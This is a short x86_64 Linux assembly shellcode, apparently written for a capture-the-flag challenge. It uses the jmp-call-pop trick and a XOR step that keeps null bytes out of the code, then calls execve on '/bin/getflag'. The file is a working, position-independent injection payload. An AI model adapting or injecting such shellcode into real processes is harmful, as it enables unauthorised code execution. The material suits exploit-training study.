BITS 64
; Author Rinzler - l33tim Team
; /bin/getflag Linux x86_64 Shellcode
; Shellcode size 33 bytes
global _start

_start:
	jmp _push_funcname

_execve_func:
	pop rdi
	xor byte [rdi + 12], 0x41	; last byte fix
	push 59
	pop rax
	cdq
	xor esi, esi
	syscall

_push_funcname:
	call _execve_func
	func: db '/bin/getflagA'